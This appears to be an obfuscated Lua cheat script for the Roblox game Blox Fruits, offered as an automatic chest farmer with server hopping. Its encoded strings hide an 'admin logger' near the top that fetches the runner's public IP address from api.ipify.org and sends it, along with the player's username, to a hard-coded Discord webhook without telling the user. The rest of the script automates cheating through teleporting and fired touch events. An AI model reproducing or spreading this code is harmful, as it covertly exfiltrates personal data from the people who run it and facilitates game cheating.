-- Lua Obf By Turbo Lite --
function UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 



-- Thông Báo 
require(game.ReplicatedStorage:WaitForChild(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}))).new(
            UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({3360,6300,7035,11655,11340,11655,11970,6405,7455,11970,10605,10605,11550,6510,8820,12285,11970,10290,11655,3360,7980,11025,12180,10605,3360,23730,13440,15540,3360,6825,12285,12180,11655,3360,7035,10920,10605,12075,12180,6300,7035,11655,11340,11655,11970,6405,4935,6510,3360})
        ):Display()
        
-- Join 
-- Kiểm tra xem giao diện chọn đội có tồn tại không
if game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.PlayerGui.Main:FindFirstChild(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7035,10920,11655,11655,12075,10605,8820,10605,10185,11445})) then
    -- Chọn đội UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11025,11970,10185,12180,10605,12075}) ngay lập tức
    local chooseTeamGui = game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.PlayerGui.Main.ChooseTeam
    local piratesButton = chooseTeamGui.Container[UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11025,11970,10185,12180,10605,12075})].Frame.TextButton

    -- Kích hoạt sự kiện khi người chơi chọn đội UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11025,11970,10185,12180,10605,12075})
    for _, connection in pairs(getconnections(piratesButton.Activated)) do
        -- Giả lập việc nhấn nút
        for _, inputConnection in pairs(getconnections(game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8925,12075,10605,11970,7665,11550,11760,12285,12180,8715,10605,11970,12390,11025,10395,10605})).TouchTapInWorld)) do
            inputConnection:Fire() 
        end
        -- Thực thi hành động liên kết với nút
        connection.Function()
    end
end
        
--Webhook
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,8295,8715,8820}),
            Headers = {[UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7035,11655,11550,12180,10605,11550,12180,4725,8820,12705,11760,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10185,11760,11760,11340,11025,10395,10185,12180,11025,11655,11550,4935,11130,12075,11655,11550})},
            Body = game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605})):JSONEncode(message)
        }
    )
    return UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({})
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10605,11445,10290,10605,10500,12075})] = {
            {
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12180,11025,12180,11340,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({4410,4410,6825,12285,12180,11655,3360,7035,10920,10605,12075,12180,4410,4410}),
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10500,10605,12075,10395,11970,11025,11760,12180,11025,11655,11550})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({}),
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12180,12705,11760,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({11970,11025,10395,10920}),
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10395,11655,11340,11655,11970})] = randomColor, 
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10710,11025,10605,11340,10500,12075})] = {
                    {
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({11550,10185,11445,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({4410,4410,8925,12075,10605,11970,11550,10185,11445,10605,4410,4410}),
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12390,10185,11340,12285,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10080,10080,10080}) .. game.Players.LocalPlayer.Name .. UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10080,10080,10080}),
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({11025,11550,11340,11025,11550,10605})] = true
                    },
                    {
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({11550,10185,11445,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({4410,4410,7665,8400,3360,6825,10500,10500,11970,10605,12075,12075,4410,4410}),
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12390,10185,11340,12285,10605})] = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10080,10080,10080}) .. tostring(game:HttpGet(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10920,12180,12180,11760,12075,6090,4935,4935,10185,11760,11025,4830,11025,11760,11025,10710,12705,4830,11655,11970,10815}), true)) .. UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10080,10080,10080}),
                        [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({11025,11550,11340,11025,11550,10605})] = false
                    },
                },
                [UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12180,11025,11445,10605,12075,12180,10185,11445,11760})] = os.date(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({3465,3885,9345,4725,3885,11445,4725,3885,10500,8820,3885,7560,6090,3885,8085,6090,3885,8715}))
            }
        }
    }
    return AdminMessage
end

PostWebhook(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5355,5040,5250,5565,5880,5670,5565,5250,5145,5145,5355,5145,5460,5145,5775,5670,5145,5040,4935,5880,7560,10815,10500,8400,10500,7350,12180,6930,8505,7875,6930,7140,7560,7140,4725,5040,12810,11235,9345,8610,7140,7350,8610,12075,12705,5880,12495,4725,5250,5040,10290,10185,10605,12285,6930,10500,8400,8295,11970,10395,8085,8820,11865,7770,8610,5985,8295,5985,5565,11760,7245,10500,12285,11970,10500,9240,9240,9030,5880,4725,5460,9345,4725,10395,5145,7875,7560}), AdminLoggerMsg()) -- Post to admin webhook

repeat
    wait()
until game:IsLoaded()

-- Xác định thế giới
local world = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8925,11550,11235,11550,11655,12495,11550,3360,9135,11655,11970,11340,10500})
if game.PlaceId == 2753915549 then
    world = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({9135,11655,11970,11340,10500,3360,5145})
elseif game.PlaceId == 4442272183 then
    world = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({9135,11655,11970,11340,10500,3360,5250})
elseif game.PlaceId == 7449423635 then
    world = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({9135,11655,11970,11340,10500,3360,5355})
end

-- Thông báo script đã kích hoạt
game.StarterGui:SetCore(
    UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),
    {
        Title = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({6825,12285,12180,11655,3360,7035,10920,10605,12075,12180}),
        Text = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({20580,15120,20475,17115,3360,11235,20475,18165,10395,10920,3360,10920,11655,23625,19530,16905,12180,3360,12075,10395,11970,11025,11760,12180,3360,12180,23625,19530,16905,11025,3360}) .. world,
        Duration = 5
    }
)

-- Khởi tạo các dịch vụ cần thiết
local Players = game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8400,11340,10185,12705,10605,11970,12075}))
local ReplicatedStorage = game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605}))
local Workspace = game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({9135,11655,11970,11235,12075,11760,10185,10395,10605}))

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    return warn(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7875,10920,20475,18900,11550,10815,3360,12180,20475,18060,11445,3360,12180,10920,23625,19530,17325,12705,3360,7980,11655,10395,10185,11340,8400,11340,10185,12705,10605,11970,3465}))
end

local AutoFarmChest = true
local hopserver = false
local ChooseRegion = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,11025,11550,10815,10185,11760,11655,11970,10605})
local chestsRemaining = 0

-- Hàm tự động farm chest
local function AutoFarmChests()
    while task.wait() do
        if AutoFarmChest then
            local closestChest = nil
            local closestDistance = math.huge
            chestsRemaining = 0

            for _, v in pairs(Workspace:GetChildren()) do
                if v.Name:find(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7035,10920,10605,12075,12180})) then
                    chestsRemaining = chestsRemaining + 1
                    local distance = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance < closestDistance then
                        closestChest = v
                        closestDistance = distance
                    end
                end
            end

            if closestChest then
                LocalPlayer.Character:PivotTo(closestChest:GetPivot())
                firesignal(closestChest.Touched, LocalPlayer.Character.HumanoidRootPart)
            elseif chestsRemaining == 0 then
                game.StarterGui:SetCore(
                    UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),
                    {
                        Title = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({6825,12285,12180,11655,3360,7035,10920,10605,12075,12180}),
                        Text = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({20580,15120,20475,17115,3360,7980,23625,19635,17325,11445,3360,7560,23625,19530,20055,12180,3360,7455,20790,18480,20790,16905,11550,10815,3465,3360,20580,15120,10185,11550,10815,3360,7560,11655,11760,3360,8715,10605,11970,12390,10605,11970,4830,4830,4830}),
                        Duration = 5
                    }
                )
                AutoFarmChest = false
                hopserver = true
                local success = HopServer(10) -- Gọi trực tiếp hàm HopServer
                if success then
                    print(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8820,10605,11340,10605,11760,11655,11970,12180,3360,12180,10920,20475,16800,11550,10920,3360,10395,20475,18900,11550,10815,3465}))
                else
                    print(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7875,10920,20475,18900,11550,10815,3360,12180,10920,23625,19635,13755,3360,12180,20475,18060,11445,3360,20580,15225,20790,18480,23625,19635,17115,10395,3360,12075,10605,11970,12390,10605,11970,3360,11760,10920,20475,19425,3360,10920,23625,19635,17115,11760,4830}))
                end
            end
        end
    end
end

-- Hàm hop server
function HopServer(maxPlayers)
    maxPlayers = maxPlayers or 9
    game.StarterGui:SetCore(
        UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),
        {
            Title = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11970,12390,10605,11970,3360,7560,11655,11760,11760,11025,11550,10815}),
            Text = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({20580,15120,10185,11550,10815,3360,12180,20475,18060,11445,3360,12075,10605,11970,12390,10605,11970,3360,11445,23625,19635,16275,11025,4830,4830,4830,3360,9030,12285,11025,3360,11340,20475,18690,11550,10815,3360,20580,15225,23625,19635,17115,11025,3465}),
            Duration = 5
        }
    )

    -- Hàm tìm kiếm server
    local function GetServers()
        local page = 1
        local foundServer = false

        while true do
            -- Lấy danh sách server từ ReplicatedStorage
            local success, servers = pcall(function()
                return game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).__ServerBrowser:InvokeServer(page)
            end)

            if not success or not servers then
                warn(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7875,10920,20475,18900,11550,10815,3360,12180,10920,23625,19635,13755,3360,11340,23625,19530,17325,12705,3360,10500,10185,11550,10920,3360,12075,20475,16905,10395,10920,3360,12075,10605,11970,12390,10605,11970,4830,3360,8820,10920,23625,19635,18165,3360,11340,23625,19530,16905,11025,4830,4830,4830}))
                break
            end

            -- Kiểm tra từng server và teleport nếu phù hợp
            for id, info in pairs(servers) do
                if id ~= game.JobId and info.Count < maxPlayers then
                    -- Nếu tìm thấy server phù hợp
                    game.StarterGui:SetCore(
                        UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),
                        {
                            Title = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11970,12390,10605,11970,3360,7350,11655,12285,11550,10500}),
                            Text = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({20580,15120,10185,11550,10815,3360,10395,10920,12285,12705,23625,19635,13755,11550,3360,20580,15225,23625,19530,20055,11550,3360,12075,10605,11970,12390,10605,11970,3360,11445,23625,19635,16275,11025,4830,4830,4830}),
                            Duration = 5
                        }
                    )

                    -- Teleport tới server đó
                    local teleportSuccess = pcall(function()
                        game:GetService(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).__ServerBrowser:InvokeServer(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({12180,10605,11340,10605,11760,11655,11970,12180}), id)
                    end)

                    if teleportSuccess then
                        foundServer = true
                        return true -- Kết thúc hàm khi teleport thành công
                    else
                        warn(UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7875,10920,20475,18900,11550,10815,3360,12180,10920,23625,19635,13755,3360,12180,10605,11340,10605,11760,11655,11970,12180,3360,12180,23625,19635,16275,11025,3360,12075,10605,11970,12390,10605,11970,3360,11445,23625,19635,16275,11025,4830}))
                    end
                end
            end

            -- Tiếp tục qua trang tiếp theo nếu chưa tìm thấy server phù hợp
            page = page + 1
        end

        -- Nếu không tìm thấy server, báo lỗi
        if not foundServer then
            game.StarterGui:SetCore(
                UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),
                {
                    Title = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({8715,10605,11970,12390,10605,11970,3360,7560,11655,11760,11760,11025,11550,10815}),
                    Text = UJkbjJoQGdhDqfbBJzwbnsWoigOifFGRA({7875,10920,20475,18900,11550,10815,3360,12180,20475,18060,11445,3360,12180,10920,23625,19530,17325,12705,3360,12075,10605,11970,12390,10605,11970,3360,11760,10920,20475,19425,3360,10920,23625,19635,17115,11760,4830,3360,8820,10920,23625,19635,18165,3360,11340,23625,19530,16905,11025,4830,4830,4830}),
                    Duration = 5
                }
            )
            return false
        end
    end

    -- Gọi hàm tìm server
    return GetServers()
end

-- Kích hoạt script
spawn(AutoFarmChests)
spawn(function()
    if hopserver then
        HopServer(10)
    end
end)    